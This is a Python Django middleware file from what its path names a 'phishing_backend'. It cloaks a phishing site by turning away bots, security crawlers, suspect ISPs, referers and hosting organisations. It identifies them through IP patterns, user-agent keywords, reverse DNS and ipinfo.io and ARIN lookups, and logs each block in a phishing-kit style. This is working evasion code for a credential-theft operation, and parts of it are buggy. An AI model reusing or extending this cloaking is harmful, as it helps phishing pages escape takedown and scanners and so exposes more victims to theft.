# phishing_backend/api/middleware/block_ips_middleware.py
from datetime import datetime
import json
import re
from urllib.parse import urlparse

import requests
from core.Bots.blockeds.bot_patterns import bot_patterns_REMOTE_ADDR
from core.Bots.blockeds.user_agents import bot_keywords_USER_AGENTS
from core.Bots.blockeds.browser_agents import bot_keywords_BROWSER_AGENTS
from core.Bots.blockeds.blocked_referer import bot_BLOCKED_REFERERS
from core.Bots.blockeds.hostnames import bot_patterns_HOSTNAME
from core.Bots.blockeds.shit_isps import bot_keywords_SHIT_ISPS
from core.Bots.blockeds.bad_names import bot_keywords_BAD_NAMES

from django.http import HttpResponseForbidden
from user_agents import parse
from core.app_config import app_settings as app_set

import socket

# def block_ips_middleware(get_response):
#     def middleware(request):
#         client_ip = request.META.get('REMOTE_ADDR')
#
#         print('##############################')
#         print(client_ip)
#
#         if client_ip in BLOCKED_IPS:
#             return HttpResponseForbidden("Access Denied")
#
#         response = get_response(request)
#         return response
#
#     return middleware


import re
from django.http import HttpResponseForbidden


import os
from urllib.parse import urlparse
from django.http import HttpResponseForbidden, HttpResponseRedirect

# Ensure the log directory exists
log_dir = "./Logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)


def block_ips_middleware(get_response):

    def middleware(request):
        bot_count = 0
        app_settings = app_set
        client_ip = get_client_ip(request)
        user_agent_string = request.META.get("HTTP_USER_AGENT", "")
        referer = request.META.get("HTTP_REFERER", None)  # Get the referer header
        hostname_ip = get_hostname_from_ip(client_ip)


        # Check for bots
        bot_response = bot_check_one(client_ip, user_agent_string, referer, hostname_ip)
        if bot_response:
            return bot_response  # If a bot is detected, return the Forbidden response
        
        
        #log_client(app_settings,client_ip, user_agent_string)
#
        #if check_proxy(app_settings, client_ip) > 0:
        #    bot_count += 1
        #    log_bot_details(
        #        bot_count, client_ip, user_agent_string,
        #        )
        #    return HttpResponseForbidden("Access Denied")

        response = get_response(request)
        return response

    return middleware


def bot_check_one(client_ip, user_agent_string, referer, hostname_ip):
    bot_count = 0

    # Check if client_ip matches any pattern in bot_patterns_REMOTE_ADDR
    if any(re.match(pattern, client_ip) for pattern in bot_patterns_REMOTE_ADDR):
        bot_count += 1
        log_bot_details(bot_count, client_ip, user_agent_string)
        return HttpResponseForbidden("Access Denied")

    # Check for bot agents
    if check_user_agent_for_bots(user_agent_string) > 0:
        bot_count += 1
        log_bot_details(bot_count, client_ip, user_agent_string)
        return HttpResponseForbidden("Access Denied")

    # Check for bot agents Browser
    if check_user_agent_for_bots_browser(user_agent_string) > 0:
        bot_count += 1
        log_bot_details(bot_count, client_ip, user_agent_string)
        return HttpResponseForbidden("Access Denied")

    # Check for bot agents Referer
    if check_referer_for_bots(referer) > 0:
        bot_count += 1
        log_bot_details(bot_count, client_ip, user_agent_string)
        return HttpResponseForbidden("Access Denied")

    # Check for bot IP Hostname
    if check_hostname_for_bots(hostname_ip) > 0:
        bot_count += 1
        log_bot_details(bot_count, client_ip, user_agent_string)
        return HttpResponseForbidden("Access Denied")

    # Check for bot IP SHIT ISP
    if check_isp_for_bots(client_ip) > 0:
        bot_count += 1
        log_bot_details(bot_count, client_ip, user_agent_string)
        return HttpResponseForbidden("Access Denied")

    # Check for bot IP Hostname
    if check_for_bots(user_agent_string) > 0:
        bot_count += 1
        log_bot_details(bot_count, client_ip, user_agent_string)
        return HttpResponseForbidden("Access Denied")

    # Check for bot Bad Names
    if check_ip_bot_or_human(client_ip) > 0:
        bot_count += 1
        log_bot_details(bot_count, client_ip, user_agent_string)
        return HttpResponseForbidden("Access Denied")

    # If no bot is detected, return None to indicate that the request should proceed
    return None




def log_bot_details(bot_count, ip, user_agent):
    if bot_count != 0:
        # Get the current date and time
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        # Get the OS and Browser
        os_info = get_user_os(user_agent)
        browser_info = get_user_browser(user_agent)
        print("#######################")
        print(browser_info)
        print(os_info)

        # Create the log message
        message = f"+++++[ BOT - Bot-Crawler.py ]+++++\n"
        message += f"IP         : {ip}\n"
        message += f"OS         : {os_info}\n"
        message += f"Browser    : {browser_info}\n"
        message += f"User-Agent : {user_agent}\n"
        message += f"+++++[ ######### ]+++++\n\n"

        # Write the message to a log file
        with open("./Logs/botlogs.txt", "a+") as log_file:
            log_file.write(message)

        # Redirect the user to a search page
        redirect_url = f"https://href.li/?https://www.google.com/search?q="
        return HttpResponseRedirect(redirect_url)


def get_user_browser(user_agent):
    user_agent_info = parse(user_agent)

    # Extract browser
    browser = user_agent_info.browser.family

    return browser


def get_user_os(user_agent):
    user_agent_info = parse(user_agent)

    # Extract OS
    os = user_agent_info.os.family

    return os


def check_user_agent_for_bots(user_agent):

    bot_count = 0
    if user_agent:
        for keyword in bot_keywords_USER_AGENTS:
            if keyword.lower() in user_agent.lower():  # Case-insensitive check
                bot_count += 1

    return bot_count


def check_user_agent_for_bots_browser(user_agent):
    bot_count = 0

    for agent in bot_keywords_BROWSER_AGENTS:
        if agent.lower() in user_agent.lower():  # Case-insensitive check
            bot_count += 1

    return bot_count


def check_referer_for_bots(http_referer):
    bot_count = 0
    if http_referer:
        # Parse the referer URL to get the host
        parsed_referer = urlparse(http_referer)
        referer_host = parsed_referer.hostname

        print(referer_host)

        if referer_host in bot_BLOCKED_REFERERS:
            bot_count += 1

    return bot_count


def get_hostname_from_ip(ip):
    try:
        # Perform reverse DNS lookup
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname
    except socket.herror:
        # If there's an error (e.g., no hostname found), return None
        return None


def check_hostname_for_bots(hostname):

    bot_count = 0
    if hostname:
        for keyword in bot_patterns_HOSTNAME:
            if keyword.lower() in hostname.lower():  # Case-insensitive check
                bot_count += 1

    return bot_count


def check_isp_for_bots(user_ip=None):
    """Check if the ISP belongs to known suspicious ISPs and increment bot count."""

    # Default IP if no IP is provided
    ipp = user_ip if user_ip and user_ip != "" else "1.1.1.1"

    try:
        # Fetch ISP information from ipinfo.io
        response = requests.get(f"http://ipinfo.io/{ipp}/org")
        ISP = response.text.strip()

        print("ISP ##############################")
        print(ISP)

        if not ISP:
            return "ppp"  # Return if no ISP data is found

        # Initialize bot count
        bot_count = 0

        # Check if ISP matches any suspicious ISPs
        for isp in bot_keywords_SHIT_ISPS:
            if (
                isp.lower() in ISP.lower()
            ):  # Check if ISP is in the list (case-insensitive)
                bot_count += 1

        return bot_count

    except requests.RequestException:
        return "ppp"  # Return if there's any error in the HTTP request



def check_for_bots(user_agent):
    #bot_count = 0
    """Check if the user agent contains known bot-related keywords."""
    if not user_agent or user_agent in ["", " ", "\t"]:
        return 0  # Treat invalid user agents as having no bot presence

    user_agent = user_agent.lower()  # Convert user agent to lowercase
    bot_count = sum(
        1 for keyword in bot_keywords_USER_AGENTS if keyword.lower() in user_agent
    )

    return bot_count





def check_ip_bot_or_human(ip):
    url = f"https://rdap.arin.net/registry/ip/{ip}"

    # Perform a GET request to fetch the data
    response = requests.get(url)
    data = response.text

    # Parsing the data
    try:
        # Convert the data to a dictionary from JSON format
        data_dict = json.loads(data)
    
        
        # Extract the organization name
        org_name = data_dict.get("name", "").replace('"', "").replace(" ", "").replace("\n", "")

        # Split the name by '-' and get the first part
        final = org_name.split('-')[0]
        
        # List of bad names
        print(final)

        if final in bot_keywords_BAD_NAMES:
            return 1
        else:
            return 0
        
    except json.JSONDecodeError:
        return "Error parsing JSON response"
    




def get_client_ip(request):
    ipaddress = request.META.get('HTTP_X_FORWARDED_FOR', None)
    
    # If the X-Forwarded-For header is not present, use the REMOTE_ADDR header
    if not ipaddress:
        ipaddress = request.META.get('REMOTE_ADDR', 'Unknown')
    
    # If the request is going through a proxy, the X-Forwarded-For header can contain a comma-separated list of IPs.
    # We want the first IP in that list.
    if ipaddress and ',' in ipaddress:
        ipaddress = ipaddress.split(',')[0]

    return ipaddress









#########################



def log_client(app_settings, client_id, useragent):
    if app_settings.get("log_user") == "1":
        # Log Client
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
        user_agent = useragent
        log_message = f"[{date}] CLIENT LOGGED *** {client_id} *** [{user_agent}]\n"

        with open("Logs/logs.txt", "a") as logfile:
            logfile.write(log_message)




def check_proxy(settings, ip):
    if settings.get("proxy_block") == "1":
        # Check VPN | Proxy
        url = f"https://blackbox.ipinfo.app/lookup/{ip}"

        try:
            response = requests.get(url, verify=True)
            print(response.text)

            resp = response.text.strip()  # Get the response and strip any excess whitespace

            print("#################")
            print(resp)
            if ip != "127.0.0.1" and resp.lower() == "y":
                # Log proxy blocking action
                with open("Logs/proxy-block.txt", "a") as click:
                    date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
                    click.write(f"{ip}|{date}|VPN/Proxy\n")

                return 1  # Return 1 if proxy is detected
            #elif ip != "127.0.0.1" and resp.lower() == "n":
            return 0  # Return 0 if no proxy is detected

        except requests.exceptions.RequestException as e:
            # Handle possible network or request errors
            print(f"Error: {e}")
            return 0  # Return 0 if an error occurs during the request




def get_country_from_ip(ip_address):
    url = f"http://ipinfo.io/{ip_address}/json"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        country = data.get("country", "Country not found")
        return country
    else:
        return "Error: Unable to fetch data"




def get_city_from_ip(ip_address):
    url = f"http://ipinfo.io/{ip_address}/json"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        city = data.get("city", "City not found")
        return city
    else:
        return "Error: Unable to fetch data"
